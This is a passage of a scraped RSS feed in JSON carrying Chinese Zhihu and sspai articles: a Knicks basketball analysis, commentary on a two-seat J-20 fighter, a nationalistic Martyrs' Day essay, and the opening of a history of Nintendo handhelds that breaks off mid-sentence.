data-original=\"https://pic1.zhimg.com/v2-2bd41ede98552cade9cdfe5fef9879a8_r.jpg\"></figure><p class=\"ztext-empty-paragraph\"><br></p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p>这一套在常规赛可以，但到了季后赛就不行了。那有人会问了，不是说好的防守赢得总冠军吗？怎么到了纽约这儿，连首轮都过不了了？搁这儿针对我纽约是吧？</p>\n<hr>\n<p>防守赢得总冠军当然没错，但这句话其实还有后半句，至少在保证平均进攻水准的前提下。尼克斯在季后赛圈的16支球队里，进攻达到平均水准了吗？</p>\n<p>显然是没有，所以纽约和老鹰的比赛，前期还能僵持住。可一旦到了要连续得分顶住压力的时候，纽约就开始溃败了，锡伯杜最后无奈，只好把罗斯抬上首发，心中默念一万遍“徒儿救我”。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<figure data-size=\"normal\"><img src=\"https://pic1.zhimg.com/v2-a88983a2f81c31e4c1fb98e946296e00_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"737\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic1.zhimg.com/v2-a88983a2f81c31e4c1fb98e946296e00_r.jpg\"></figure><p class=\"ztext-empty-paragraph\"><br></p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p>罗斯再厉害也不是十年前那朵盛放天穹的玫瑰了，最终纽约的球迷只能咬牙切齿地看着吹杨在麦迪逊花园夺走胜利。</p>\n<hr>\n<p>纽约这个夏天的交易，也基本是围绕着<b>补强进攻</b>在展开：小佩顿要去太阳？放他走。布洛克要去达拉斯？随他去。然后签回法国国手富尼耶和被雷霆买断的沃克，这都是为了增加后卫线上的进攻能力。</p>\n<p>但沃克和富尼耶来到纽约都要进首发吧，再搭上一个组织前锋兰德尔和球队未来巴雷特，这球权看上去有点拥挤啊……更重要的是，<b>沃克和富尼耶两位的风格好像不太符合锡伯杜教练执教的理念</b>。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-0506bda37c496529a5763d265e48da5b_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"577\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic4.zhimg.com/v2-0506bda37c496529a5763d265e48da5b_r.jpg\"></figure><p class=\"ztext-empty-paragraph\"><br></p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p>众所周知，锡伯杜的球队强调强硬、拼搏、积极和坚韧，所有这一切的品质都和防守有关系。<b>要给锡伯杜打球，不管你是谁，不管你能力如何，首先你要拿出防守的态度来。</b></p>\n<hr>\n<p>所以一般的天才都不喜欢给锡伯杜打球，因为天才都是众星拱月捧起来的，有几个刚进联盟就愿意防守的。真正愿意沉下心去防的，绝大多数还是那些首轮中后段的球员，甚至是次轮秀。</p>\n<p>罗斯当年是状元，但风城玫瑰是出了名的孤傲，上场打球拼尽全力，不摆架子，场下也没有太多花花肠子，所以他能和锡伯杜凑得到一块儿。吉巴就更明显了，首轮最后一位的出身，全靠着防守入了锡伯杜的法眼，然后一步步打上主力，成为球星。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-66f44c5cc6e6dfddf41b32fdd3388b97_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1077\" data-rawheight=\"677\" class=\"origin_image zh-lightbox-thumb\" width=\"1077\" data-original=\"https://pic4.zhimg.com/v2-66f44c5cc6e6dfddf41b32fdd3388b97_r.jpg\"></figure><p class=\"ztext-empty-paragraph\"><br></p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p>但是像唐斯和维金斯这样的球员，和锡伯杜就根本不是一路人，而且随着球员的个人意识越来越浓烈，锡伯杜的空间会越来越稀少。所以锡伯杜走到哪里都喜欢用自己的老球员，因为他们之间能够形成一个正向的循环。</p>\n<hr>\n<p>沃克以前无论是在黄蜂，还是后来到了绿军，都是球队的核心球员；富尼耶无论是在魔术亦或者法国队，也是当之无愧的核心，所以他们俩都不算是锡伯杜能用得顺手的球员，防守也不能算好。</p>\n<p>事实上，<b>他们都是绝对的攻强于守的球员，而且进攻上都是个人进攻大于组织能力的类型</b>。这种球员一旦状态不好，就容易显得粘球而且效率低下。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<figure data-size=\"normal\"><img src=\"https://pic2.zhimg.com/v2-4dc9035b1b5ff4d7fdaa46e83b369661_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"635\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic2.zhimg.com/v2-4dc9035b1b5ff4d7fdaa46e83b369661_r.jpg\"></figure><p class=\"ztext-empty-paragraph\"><br></p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p>就状态而言，富尼耶或许比沃克的确定性更强，因为谁也不知道沃克的膝盖现在究竟恢复到哪个地步了。</p>\n<hr>\n<p>摆在锡伯杜面前的第二个难题还有<b>终结阵容怎么摆</b>？</p>\n<p>看起来最简单的就是沃克+富尼耶+罗斯+巴雷特+兰德尔的小阵容，但三后卫的身高和防守能力实在太容易被人捅穿，而且巴雷特上四，兰德尔上五也在身型上很吃亏。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-3174e4732a93255d0e9463fb772ccbe3_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"676\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic4.zhimg.com/v2-3174e4732a93255d0e9463fb772ccbe3_r.jpg\"></figure><p class=\"ztext-empty-paragraph\"><br></p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p>这种阵容和锡伯杜的球队理念完全是背道而驰，但如果要拿人下去，又把谁拿下去好呢？</p>\n<hr>\n<p>关键时刻的球在谁手里也值得思考，以前简单，不是罗斯就是兰德尔，现在选择多了，但如何做出最好的选择并不更容易。</p>\n<p>估计锡伯杜还是会一如既往地信任罗斯，倒不是说罗斯一定会比其他几位状态更好，而是锡伯杜对于他的信任是其他人无可比拟的，这就是锡伯杜的方式。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<figure data-size=\"normal\"><img src=\"https://pic3.zhimg.com/v2-5652da0108813ce8eb852dd843438f06_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"572\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic3.zhimg.com/v2-5652da0108813ce8eb852dd843438f06_r.jpg\"></figure><p class=\"ztext-empty-paragraph\"><br></p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p><b>活，他要活在罗斯手里；死，他也死在罗斯手上。</b></p>\n<hr>\n<p>但其实作为一个普通球迷，我的想法很简单，<b>罗斯别再伤了，能再健健康康打几年就行</b>。</p>\n<p>自从16-17赛季离开纽约之后，罗斯单赛季从来没有打过52场以上的比赛，最多就是18-19赛季在森林狼的51场。</p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<figure data-size=\"normal\"><img src=\"https://pic4.zhimg.com/v2-602bcda786e3571b9008c9a89ed5c1df_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1038\" class=\"origin_image zh-lightbox-thumb\" width=\"1080\" data-original=\"https://pic4.zhimg.com/v2-602bcda786e3571b9008c9a89ed5c1df_r.jpg\"></figure><p class=\"ztext-empty-paragraph\"><br></p>\n<p class=\"ztext-empty-paragraph\"><br></p>\n<p>这里面当然也有疫情导致赛季整体缩水的原因，上赛季罗斯打了50场常规赛，占72场的70%，希望下赛季罗斯能有一个出战60场的机会。</p>\n<p><b>别再受伤，就是对他最大的期待。</b></p>\n<hr>\n<p><b>谢谢读完！</b></p>\n<p><b>每日文章首发在微信公众号——申屠，写字不易，劳烦您帮忙关注下吧！</b></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/ni-bie-shuo-hua-wo-fan-86-94?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">申屠</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br>\n","link":"http://zhuanlan.zhihu.com/p/415709935?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"珠海航展新闻发布会上，歼 20 总师杨伟回应了关于歼 20 双座的相关信息，如何看待他的回应?","date":"2021-09-30 03:43:52","description":"\n<p>一、感谢航空工业邀请，有点受宠若惊！</p>\n<p>二、既然歼20是四代（五代）隐形战机，那这一代战机最核心的战法就是“悄悄的进去、悄悄的出来”，就算发生战场遭遇战，也是以尽快逃脱为核心战法。隐形战机的战术运用特征，决定了歼20飞行员主要技能是如何掌握战机性能和敌我战场态势，而不是炫酷的超机动动作。由此决定了歼20飞行员的培训完全可以在“模拟器”上完成，不需要上歼20教练机上感受，因此也没有必要专门研制歼20双座教练机。</p>\n<p>三、杨总曾经说过，歼20会是一个大家族。那这个大家族总会有什么？首先是歼20基本型好，就是现在已经装备部队的制空战机，其作战对象敌方战斗机、预警机和加油机；其二是战斗轰炸机，其作战对象是敌人后方固定目标，包括雷达、指挥机构、电网或其他基础设施，执行这类任务的歼20一定双座配置；其三是无人战机的指挥机，未来空战态势向无人化演变，但现场指挥需要有人战机承担，执行这类任务的歼20一定要双座配置。</p>\n<p>四、基于上诉观点，双座歼20 的出现，说明中国空军战略转型已经完成，攻守兼备以攻为主。</p>\n<p>五、双座歼20将首先推出战斗轰炸机型号，这在技术上没有障碍，只是机体上做一番取舍。这样的工作对航空厂家而言没有难度，无非是指标权衡费一番功夫。</p>\n<p>六、双座歼20无人战机指挥机型号，机体无需另行研制，可以借用歼20战轰型的。但歼20无人机指挥机的作战模式确实要费尽心机，因为这是开创性工作。一切都在酝酿之中，吾等少说为佳。</p>\n<p>七、歼20还有一个发动机配置问题，等涡扇15成熟之后，歼20的红外隐身会更加完善。</p>\n<p>八、夸一夸中航工业，潜心苦行几十年终于堪当大任了。各种机型全面开花，型号推陈出新。只要有型号就有人才，只要有人才就有未来；我坚信高高在上的美国航空工业将无法持续，他们几年搞一个型号会葬送人才队伍，这才是美国空军部长彻夜难眠的原因所在；中航工业现在可以释放一些烟雾，美国空军处于一个迷茫状态，急中必然出错......</p>\n<p>（图片选择网络）</p>\n<p><img src=\"https://pic2.zhimg.com/v2-ca52224a6f17e80d8984250386793554_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"880\" data-rawheight=\"554\" data-watermark=\"watermark\" data-original-src=\"v2-ca52224a6f17e80d8984250386793554\" data-watermark-src=\"v2-5a467962cf28caffc6b1e642a91affb0\" data-private-watermark-src=\"v2-a69dc83070f27f03ddcae507a2387cd0\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-f7527bcefd27cdf58c0e310752a315df_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"780\" data-rawheight=\"410\" data-watermark=\"watermark\" data-original-src=\"v2-f7527bcefd27cdf58c0e310752a315df\" data-watermark-src=\"v2-f7e7300a19734bf80f19d405e8d1a96c\" data-private-watermark-src=\"v2-9c2356e70de17f75d615e583db76c892\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-ef2a6f60f6899b04605860db89539f75_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1980\" data-rawheight=\"1293\" data-watermark=\"watermark\" data-original-src=\"v2-ef2a6f60f6899b04605860db89539f75\" data-watermark-src=\"v2-45892e69fc43f2e509c12945a1b4ae6e\" data-private-watermark-src=\"v2-b34d7f8eb32694ea5868217994db75fe\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-248a21c181eefd04338734f1267ae88e_720w.jpeg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"950\" data-rawheight=\"810\" data-watermark=\"watermark\" data-original-src=\"v2-248a21c181eefd04338734f1267ae88e\" data-watermark-src=\"v2-173fe6fe6c81f85384fe04b84b2e6e67\" data-private-watermark-src=\"v2-d3975f4137a02247cc408cd2d64ad6ce\"></p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/la-la-shi-nu-sen?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">纪永臣</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/489572898/answer/2147617884?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">53 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/52057194?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价空军试飞员将驾驶J20在珠海航展公开亮相？</a><br><a href=\"http://www.zhihu.com/question/52057410?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">如何评价空军发言人宣布中国空军歼20战机将亮相珠海航展？</a><br>\n","link":"http://www.zhihu.com/question/489572898/answer/2147617884?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"9 月 30 日是烈士纪念日，今天该如何缅怀他们，才能走得更有力？","date":"2021-09-30 03:42:14","description":"\n<p>今天是9月30日，烈士纪念日。</p>\n<p>剑客想和大家认真探讨一下敬畏烈士、崇尚保卫英雄的话题。</p>\n<p>因为剑客始终觉得，保卫我们的民族英雄，是每名中国人的责任与良知；如果恶意抹黑和诋毁我们的英雄，那是昧着良心在做事，就是在忘本和辱没列祖列宗。<b>中国历代都不缺乏汉奸，对烈士和英雄的不敬重，真的与汉奸何异？</b></p>\n<p>英雄，是一个国家光辉历史的记忆，是一个民族坚挺不屈的脊梁，是社会发展的重要坐标，也是历史进步的力量源泉。列宁曾说，忘记历史就意味着背叛。但实际上，比忘记历史更可怕的是对历史的歪曲，对民族英雄的故意诋毁和诬蔑。习主席指出：“一个有希望的民族不能没有英雄，一个有前途的国家不能没有先锋。”</p>\n<p>很多人想问剑客，保卫英雄是不是只是我们国家这么重视了？其实，崇尚英雄和保卫英雄这种关系到国家前途命运、关系民族信仰和社会发展稳定的大事，没有哪个国家敢怠慢。哪个国家怠慢了，必遭大祸！</p>\n<p>1941年冬天一个寒冷的夜晚，一个放火烧德军马厩的年轻女孩被抓住了。风雪寒冬，尽管女孩弱不禁风，但面对法西斯德军的严刑拷打，她没有吐露半点秘密，直到被罪恶的敌人推上绞刑架。这位名叫卓娅的年轻女孩英勇就义，激起苏联人民气贯长虹般的斗志，最终取得反法西斯战争的胜利。</p>\n<p>然而，在卓娅牺牲50年后，这位苏联英雄却再次被推上“绞刑架”。不过，刽子手不再是德军法西斯，而是一篇由苏联人撰写、所谓“解读真相”的文章。文章诡辩称，“卓娅当年烧的不是德军马厩，而是普通老百姓的民房，是当时愤怒的村民把她抓住后扭送给德军的。”英雄在谎言的淹没中轰然倒地，整个苏联的人心在谎言中由惊讶到徘徊到动摇。此时，正是苏联解体前夕。</p>\n<p>苏联解体后，受西方价值观影响，甚至在西方势力的直接资助下，俄罗斯出现了一种否认、歪曲甚至篡改历史的现象，其中歪曲二战真相、贬低和侮辱英雄的不良倾向日益加剧。许多影视片、教科书和文学作品将苏联说成是发动第二次世界大战的罪人，苏军对欧洲的解放被曲解为是占领和侵略，斯大林在二战中的形象受到诋毁，苏军指挥员和军官们成了被谩骂和批评的对象，在中国家喻户晓的苏联女英雄卓娅则被描绘成一个精神病人，诬蔑她烧毁的是苏联的民房而不是德军的马厩，舍身堵枪眼的马特洛索夫被描绘成一个“少年犯”。</p>\n<p>相反，二战中被德军俘虏后投敌的弗拉索夫则一度被居心不良者宣传为反对战争的斗士。更为严重的是，连军事院校里也开始出现赞扬弗拉索夫和其他叛徒的书、播放歪曲历史真相的电影。</p>\n<p><b>在俄罗斯——</b></p>\n<p>这种情况下，俄罗斯打响了一场没有硝烟的英雄保卫战，目的就是通过纪念英雄来展示真正的历史，提升国民对国家的自豪感，增强对国家未来发展的信心。</p>\n<p>于是，我们看到，莫斯科市中心的新圣女公墓矗立起一块用深灰色大理石雕刻而成、为卓娅而造的墓碑，莫斯科州鲁斯区的彼特里谢沃仍保留着一座为卓娅建的纪念馆。并且，在明斯克公路86公里标记处的一座纪念碑底座上镌刻着这样一句话：“卓娅，万古流芳的苏联女英雄，1923-1941年”。马特洛索夫也被授予“苏联英雄”称号，其服役过的步兵第254团以他的名字命名，并把马特洛索夫永远列入该团第1连的名册。</p>\n<p><b>在美国——</b></p>\n<p>就在“狼牙山五壮士”案宣判之前10天，也就是6月18日，美国海军最大、技术最先进的朱姆沃尔特级驱逐舰二号舰（DDG-1001）举行命名仪式。这艘军舰以阵亡士兵迈克尔·孟苏尔之名命名。</p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-ef6777a164ef235bf89ea66d5dc2851b_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"371\" data-rawheight=\"502\" data-watermark=\"watermark\" data-original-src=\"v2-ef6777a164ef235bf89ea66d5dc2851b\" data-watermark-src=\"v2-9685a690eabc992b2efa75f0ca2944c3\" data-private-watermark-src=\"v2-693c0e0918f36bc362d9905e1f6d1065\"></p>\n<p><br></p>\n<p>在2006年的伊拉克拉马迪战斗中，孟苏尔参加了对当地武装的一次清剿战斗，当时，孟苏尔与其他两名海豹突击队的狙击手正在一栋建筑物屋顶。孟苏尔距其他两人约有15英尺（4.5米）远。突然，一枚手雷从街上被扔了上来。手雷砸中孟苏尔胸口后弹到地上。孟苏尔“扑到手榴弹上，用身体抵挡爆炸”，于是死去，另两名海豹突击队队员虽然也受了伤但并不致命。</p>\n<p>英雄和我们普通人一样，有血有肉，有情感也有痛感。但是，他们为祖国、为人民、为党忠诚的信念和意志超乎常人。</p>\n<p>他们面对敌人的炮火，抱定必死决心，展现了革命军人的血性。这种惊天地泣鬼神的壮举，不是躲在某个角落的“键盘侠”可以理解的。</p>\n<p>20军、27军的军史，都记载着“冰雕连”史诗般的悲壮——1950年11月下旬，朝鲜战场长津湖战役中，美军南逃沿途被这样的情景震惊：一排排志愿军战士俯卧在摄氏零下40度的阵地上，手握钢枪、手榴弹，保持着战斗队形和战斗姿态，仿佛是跃然而起的“冰雕”群像。</p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-5a5f9216f84f21c9966e984acf934b87_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"419\" data-rawheight=\"454\" data-watermark=\"watermark\" data-original-src=\"v2-5a5f9216f84f21c9966e984acf934b87\" data-watermark-src=\"v2-babd424f77ef75838f3eb57ffa9f6b1e\" data-private-watermark-src=\"v2-c7caa25b893f9d27b45a3b06817c06c6\"></p>\n<p><br></p>\n<p>▲影视画面再现那段悲壮的真实历史</p>\n<p>——这是最可爱的人被冻死的壮烈场面。</p>\n<p>当美军军官向这些“冰雕”致敬时，心中疑惑，志愿军为何宁愿冻死也决不放弃阵地？也许他们没看到、或读不懂志愿军战士宋阿毛身上的一首绝笔诗：“我爱亲人和祖国，更爱我的荣誉。我是一名光荣的志愿军战士，冰雪啊！我决不屈服于你，哪怕是冻死，我也要高傲地耸立在我的阵地上。”</p>\n<p><br></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-50344a46fc1a20d13f473e06c543dc05_720w.webp?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"374\" data-rawheight=\"328\" data-watermark=\"watermark\" data-original-src=\"v2-50344a46fc1a20d13f473e06c543dc05\" data-watermark-src=\"v2-a9840d628e6a6da42cf8f4ce63849919\" data-private-watermark-src=\"v2-6474b9e8429b82397dd9f902733a0557\"></p>\n<p><br></p>\n<p>▲宋阿毛身上的一首绝笔诗</p>\n<p>电视剧《三八线》演绎了这段悲壮的历史，剧中还有一段感动亿万网友的对话。指导员陈平对志愿军战士李长顺说：“不远千里来到这儿打仗，为啥？不就是为了刚才你说的那好些个美好的生活吗……所要保护的一切，就是咱们身后的祖国”。</p>\n<p>大浪淘沙，洗尽铅华无数。多少共和国的功臣以及无数的革命英雄，为了守卫国土、守护人民，为了珍贵如金的和平生活，抛头颅、洒热血，他们是国家和民族挺立的硬骨头。</p>\n<p>往英雄身上泼污水的人群里主要有这样几种角色：</p>\n<p>一种是居心叵测，不择手段，造谣污蔑，无中生有，企图通过诋毁英雄来歪曲历史，混淆视听，通过歪曲历史来动摇国本，制造混乱，以达到其颠覆共产党执政地位和社会主义制度的险恶目的。这种人最阴险，对这种人要特别警惕，坚决打击，绝不容其罪恶阴谋得逞。一种是涉世不深的青年，他们没有主见，缺乏常识，因为逆反心理与无知、幼稚，跟着别人瞎起哄。一听说某英雄是假的，事迹是虚构的，就信以为真，不问青红皂白、来龙去脉，乱转乱发，推波助澜，当了那些别有用心的人的“炮灰”。还有一种人是因为心理阴暗，思维畸形，心头油污太脏太厚，见不得任何阳光向上的人和事，自己做不了英雄，就怀疑英雄都是假的。他们嘲笑理想，讽刺崇高，亵渎英雄，这种人貌似高深，其实内心是苍白麻木的，自己是侏儒，就敌视一切高大的形象。</p>\n<p>抗日烈士、爱国主义作家郁达夫曾说过：“一个没有英雄的民族是不幸的，一个有英雄却不知敬重爱惜的民族是不可救药的。”忽视、冷落和践踏英雄，一个国家就会失去历史、失去现在乃至失去未来。崇尚英雄、敬重英雄，才能正确认识历史，在正确的道路上不断前进。</p>\n<p>金一南教授曾言，幸福起来的人们往往不想承认自己曾经是奴隶，也不屑于承认曾经有过英雄。不知不觉中，自己那部热血奔涌、震撼人心的历史被荒弃了、抽干了，变成一部枯燥、干瘪的室内标本，放在那里无人问津。</p>\n<p>欲灭其国，先去其史。历史虚无主义者诋毁英雄，混淆视听，目的就是为了撕裂社会、制造混乱、动摇根基。危害巨大！</p>\n<p>当网上沉渣泛起、暗流涌动的事实提醒我们，保卫英雄与诋毁英雄，是一场固根、铸魂的生死战。</p>\n<p>英雄是“国家名片”，是精神支柱。一般公民的正当权益受到侵害时，他本人或委托人都可以出来提起申诉，英雄人物的名誉、形象受到损害时，呼唤全社会支持和正义的声援！</p>\n<p>这场战斗，我们不能输也输不起，不能退也退不得。保卫英雄，我们责无旁贷，我们决不袖手旁观，正义决不缺席！</p>\n<p>中国近代史是一个造就英雄的历史，也是一个出产汉奸的历史。随着1931年九一八事变的爆发、日本对华侵略的屡屡得手，“汉奸现象”的历史沉渣泛起滔滔浊浪。</p>\n<p>1932年3月，伪满洲国在长春成立，清王朝末代皇帝溥仪被日本人扶上了“执政”宝座，再一次心甘情愿当上了“儿皇帝”，这是近代列强入侵中国以来第一个以国家面目出现的汉奸伪政权。</p>\n<p>1938年12月，身为国民党二号人物的副总裁汪精卫，竟然从陪都重庆出逃越南河内，公开发表“艳电”叛国投敌，并于1940年3月在日本军刀支撑下成立汪伪“国民政府”，他曾主张日本轰炸重庆，做了近代以来中国历史上最大的汉奸。</p>\n<p>抚今追昔，如果我们任凭抹黑英雄，诋毁英雄的人大行其道，那就是在放任汉奸，放任他们侵蚀和伤害我们的国家和民族！</p>\n<p><b>警惕啊！我的中华兄弟姐妹们！</b></p>\n<p><b>9月30日，烈士纪念日，以此文希望唤醒更多的人！</b></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/san-jian-ke-52-28?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">三剑客</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/489785273/answer/2147838840?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">233 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/489687295?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">今天是我国第八个烈士纪念日。我们可以通过怎样的方式来纪念他们？你有哪些话，想对英烈诉说？</a><br><a href=\"http://www.zhihu.com/question/319927345?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">去参加烈士陵园可以发朋友圈吗？</a><br>\n","link":"http://www.zhihu.com/question/489785273/answer/2147838840?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"任天堂的家天下 |「世界主宰」的掌机之路 · 零","date":"2021-09-30 03:30:45","description":"\n<h3><strong>Matrix 首页推荐</strong></h3>\n<p><a href=\"https://sspai.com/matrix\">Matrix</a> 是少数派的写作社区，我们主张分享真实的产品体验，有实用价值的经验与思考。我们会不定期挑选 Matrix 最优质的文章，展示来自用户的最真实的体验和观点。</p>\n<p>文章代表作者个人观点，少数派仅对标题和排版略作修改。</p>\n<hr>\n<p>2020 年 9 月 16 日，任天堂 New 3DS 全系停产，从此以后，这个世界上或许不会再有任何传统意义上的「掌机」诞生。对于自家旗下的 Switch 和 Switch Lite，任天堂一直坚称它们是「具有掌机模式的主机」和「只有掌机模式的主机」<s> 其实就是想用主机游戏的价格卖卡带 </s>，显然，在 3DS 与 PSV <s> 摆烂 </s> 大战之后的十年间，掌机市场持续低迷，到了 2021 年，竟只剩下所谓开源掌机 <s> 清库存的韭菜收割机 </s> 和 Windows 掌机 <s> UMPC 秽土转生 </s> 仍在「百家争鸣」，实在令人唏嘘。此时此刻，如果任天堂前社长山内溥在世，他一定会这样说：</p>\n<blockquote><p><i>我不明白，为什么整个行业都在谈论着复古和情怀，仿佛这掌机市场对我们来说注定凶多吉少。三十年前，我从 Game Boy 踏上征途，开始了世界主宰的道路，红帽子、绿帽子和黄耗子遂归于一统。本司产品所到之处，玩家竭诚欢迎，真可谓占尽天时，那种勃勃生机、万物竟发的境界，犹在眼前。短短三十年之后，这里竟至于一变而成为我们的葬身之地了吗？ </i></p></blockquote>\n<h2>总座高见！</h2>\n<p>要讲任天堂的掌机，总绕不过两个人：其一是上文提到的任天堂前社长山内溥，其二是掌机业界的「大贤至圣先师」：横井军平。1982 年，正值不惑之年的横井军平在半百老人山内溥的力排众议之下，终于鼓捣出了叫做 Game &amp; Watch 的新奇玩意。据说，Game &amp; Watch 的设计灵感来源于横井军平在新干线上注意到一些乘车上班的公司职员摆弄随身携带的电子计算器打发时间，其实电子计算器与游戏的渊源远不止如此，早在 20 世纪 70 年代中期，集成游戏的电子计算器就已经问世，所以，<strong>与其说是在新干线上的经历启发了横井军平，不如说是电子计算器的发展促成了 Game &amp; Watch 的诞生</strong>。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/27/5532be4a0cf5b8a02eb0d8fa54ef8704.png\"><figcaption>内置 21 点游戏的 Toshiba BC 1010-BJ 电子计算器与附带的游戏规则书</figcaption></figure><p>Game &amp; Watch 是一款利用 TN-LCD 屏幕来显示游戏内容的电子玩具，游戏的画面被提前印刷在屏幕的玻璃基板上，通过电极改变屏幕的透光率来实现画面的变化。TN-LCD 在当时并非什么黑科技，反而是在各种单色液晶显示器上被用到烂熟的技术，但这种讨巧的做法第一次让游戏画面以如此直观的形式呈现在玩家眼前，要知道，在此之前的电子玩具所显示的画面只是一些单调乏味的灯光信号，99.99% 的画面都需要玩家的脑内显卡「渲染」完成。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/09/28/38e844bce425ef5295869fff1aef665a.gif\"><figcaption>《Ball》是任天堂发行的首款 Game &amp; Watch 游戏</figcaption></figure><p>凭借着轻薄便携的机身、简单可靠的设计和创意十足的游戏玩法，Game &amp; Watch 一经出现就受到了任天堂公司上下的欢迎。然而，就在横井军平雄心勃勃的想要将其推向市场的时候，山内溥叫住了他，并且向他抛出了自己的「灵魂拷问」。</p>\n<h3>\n<strong>「</strong>为什么要叫它 Game &amp; Watch？<strong>」</strong>\n</h3>\n<p>这个看似简单的问题改写了任天堂的命运。<strong>Game &amp; Watch 的命名中，「Watch」一词具有双关含义：一是「看到」游戏，二是看到「时间」</strong>。在横井军平最初的设想之中，Game &amp; Watch 是一款具备游戏功能的电子表，他的想法并非没有道理：把 Game &amp; Watch 作为一件具有特殊卖点的日常消费品而非专门的电子玩具进行推广，以此求得更加广阔的市场前景，毕竟彼时的任天堂还没通过销售玩具的利润从 60 年代以来的巨额亏损中喘过气来，在这种前提下，用新产品打开新的市场总归是不错的选择。这听上去确实合情合理，但山内溥的下一个问题却给了横井军平当头一棒。</p>\n<h3>\n<strong>「</strong>你这能玩 Game 的 Watch，保准吗？<strong>」</strong>\n</h3>\n<p>横井军平被问懵了。Game &amp; Watch 采用两颗 SR/LR 44 纽扣电池，能够提供 30 